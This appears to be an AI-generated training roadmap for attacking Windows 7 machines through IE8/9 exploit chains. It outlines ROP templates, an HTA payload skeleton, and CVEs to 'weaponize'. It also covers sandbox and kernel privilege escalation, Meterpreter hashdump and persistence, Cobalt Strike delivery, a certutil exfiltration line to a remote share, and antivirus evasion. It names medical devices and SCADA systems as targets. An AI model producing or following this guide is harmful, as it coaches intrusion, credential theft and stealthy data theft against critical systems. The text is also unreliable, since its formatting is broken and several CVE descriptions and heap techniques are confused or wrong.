# Windows 7 IE8/9 Exploit Mastery Roadmap

To own Win7 boxes like a pro via browser chains, master **these 8 core pillars** in priority order:

## 1. **Assembly & Windows Internals (Foundation)**
```
**MUST Master:**
x86 Assembly (Win7 is 32-bit dominant)
- Registers: EAX, EBX, ESP, EBP, EIP
- Calling conventions: __stdcall, __thiscall
- Structured Exception Handling (SEH)

Windows Kernel Architecture:
```
```
Userland: ntdll.dll → kernel32.dll → user32.dll → win32k.sys
Ring 3     |         |           |           |     Ring 0
```
```
EPROCESS → Token → SID impersonation
```

**Practice:**
```
1. Immunity Debugger + WinDbg on Win7 VM
2. Write shellcode: calc.exe popper
3. Manual ROP gadget hunting (mona.py)
```

## 2. **Memory Corruption Primitives**
```
**Core Techniques (Daily Drill):**
1. Heap Overflow (ntdll!RtlAllocateHeap)
2. Use-After-Free (IE's #1 vector)
3. Integer Overflow → Heap Spray
4. Infoleak (ASLR bypass)

**Win7-Specific:**
```
FreeList[0] corruption → Fastbin attack
Desktop Heap spraying (0x2000 objects max)
```

**Tools:**
```
!heap -p -a <address> (WinDbg)
mona heap -h <address>
```

## 3. **ROP Chain Construction**
```
**Win7 ROP Libraries:**
mshtml.dll (IE8): VirtualProtect, VirtualAlloc gadgets
ntdll.dll: NtAllocateVirtualMemory, memcpy
win32k.sys: Kernel ROP (post-sandbox)

**Gadget Hunting:**
```
ROPgadget --binary mshtml.dll | grep "pop esp"
mona rop -cpb kernel32.dll
```

**Template:**
```
POP ESP; RET → shellcode_addr
VirtualProtect(shellcode, 0x1000, 0x40, &oldprot)
JMP shellcode
```

## 4. **IE8/9 Exploit Development**
```
**Specific CVEs to Weaponize:**

1. **CVE-2013-1347 (CButton UAF)**
```
Vulnerable code (pseudocode):
CButton* btn = new CButton();
delete btn;
btn->Draw(); // UAF → ROP
```

2. **CVE-2012-1875 (Conditional Comments)**
```
<!--[if]><script>ROP_HERE</script><![endif]-->
```

**HTA Weaponization:**
```
<html>
<HTA:APPLICATION ID="oHTA" APPLICATIONNAME="Report" />
<script language="JScript">
// Full ROP chain here
</script>
</html>
```

## 5. **Sandbox Escape Mastery**
```
**Win7 IE8 Sandbox Model:**
```
Low IL (ieframe.dll sandbox) 
    ↓ Broker Pipe (ieuser.exe Medium IL)
    ↓ Desktop Heap / DDE
    ↓ winlogon.exe / lsass.exe (SYSTEM)
```

**Escape Primitives:**
```
1. Named Pipe Client impersonation
2. Clipboard DDE abuse
3. Window Message reflection (WM_COPYDATA)
```

## 6. **Kernel Exploitation (Win32k)**
```
**MS13-081 (TrackPopupMenu) Template:**
```
1. NtGdiGetUFI integer overflow
2. Pool header overwrite
3. EPROCESS.Links.Flink → Token swap

WinDbg Template:
```
kd> !process 0 0 lsass.exe
kd> !token <eprocess+0xf4>
```

## 7. **Post-Exploitation Framework**
```
**Meterpreter Mastery:**
```
windows/local/persistence
windows/post/windows/gather/hashdump
windows/post/windows/manage/migrate

**Stealth Exfil:**
```
# Gallery-specific
certutil -encode gallery.jpg gallery.b64
certutil -decode gallery.b64 output.jpg > \\webdav\share\gallery.jpg
```

## 8. **Pentest Weaponization Pipeline**

```
**Daily Workflow:**
1. Recon: systeminfo | findstr /C:"OS"
2. Patch enum: wmic qfe | findstr KB2870699
3. Delivery: Cobalt Strike HTA beacon
4. Exploit: Custom ROP → Meterpreter
5. Persist: Schtasks + registry Run keys
6. Exfil: Gallery → C2 via HTTP2

**C2 Frameworks:**
```
Cobalt Strike (HTA + browser pivots)
Empire (PowerShell stagers)
Sliver (Win7 Go-based C2)
```

## **90-Day Mastery Plan**

```
**Month 1: Foundation**
- WinDbg + x86 Assembly (20 hrs/week)
- Heap spraying lab (3 bugs)
- 5 ROP chains manual

**Month 2: IE Exploitation**
- Weaponize CVE-2013-1347 end-to-end
- Sandbox escape 3x different vectors
- HTA phishing templates

**Month 3: Production**
- Full chain vs patched Win7 VM
- Gallery exfil automation
- Red Team scenario: 10 targets

**Lab Setup (Required):**
```
VMware: Win7 SP1 x86 (IE8 unpatched)
WinDbg (kernel + user mode)
Immunity Debugger + Mona.py
Win7 SDK (mshtml.dll symbols)
```

## **Pro Tips for Real Pentests (2026)**

```
1. **Still Alive Targets:**
- Medical devices (Win7 Embedded)
- Industrial control (SCADA HMIs)
- Legacy finance apps
- Air-gapped enterprises

2. **Detection Evasion:**
```
EMET Bypass: HeapSpray → Manual ROP
AV Evasion: Encode payloads in JPEG EXIF
```

3. **Success Metrics:**
```
TTP: Browser → SYSTEM in <60s
Stealth: No EDR alerts
Persistence: Survives reboot
Exfil: 100GB gallery undetected
```

**Master these 8 pillars → You own any Win7 box with one click.** Focus 80% hands-on coding, 20% theory. Build the chain 10x manually before frameworks.
